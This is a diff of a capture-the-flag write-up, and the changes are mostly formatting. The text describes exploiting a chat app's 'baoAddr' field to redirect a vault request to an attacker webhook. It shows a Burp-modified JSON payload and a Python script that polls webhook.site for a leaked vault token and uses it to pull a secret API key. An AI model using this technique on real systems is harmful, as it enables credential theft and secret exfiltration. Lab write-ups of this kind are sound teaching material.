@@ -72,7 +72,7 @@ Further inspecting I noticed that the application had a **source map** :D Made i
 
 Looking through `chat.ts`, I came across the request type used for sending messages:
 
-```ts
+```TypeScript
 export const MAX_MESSAGE_LENGTH = 2_000;
 
 export type ChatMessage = {
@@ -107,13 +107,13 @@ Time to pull our webhook url :)
 
 I used Burp Suite to change a normal chat request and added:
 
-
+```json
 {
   "conversationId": "undefined",
   "content": "wsp beijing",
   "baoAddr": "https://<my-webhook>"
 }
-
+```
 
 ![alt text](image1.png)
 
@@ -192,10 +192,8 @@ requests.post(
         "baoAddr": f"https://webhook.site/{webhook}"
     }
 )
-
 while True:
     r = requests.get(f"https://webhook.site/token/{webhook}/requests").json()
-
     for req in r["data"]:
         token = req["headers"].get("x-vault-token")
 
@@ -204,11 +202,9 @@ while True:
 
     if token:
         break
-
     time.sleep(1)
 
 key = requests.get(f"{bao}/v1/secret/data/flag",headers={"X-Vault-Token": token[0]}).json()["data"]["data"]["FLAG_API_KEY"]
-
 print(requests.get(flag,headers={"x-api-token": key}).text)
 ```
 
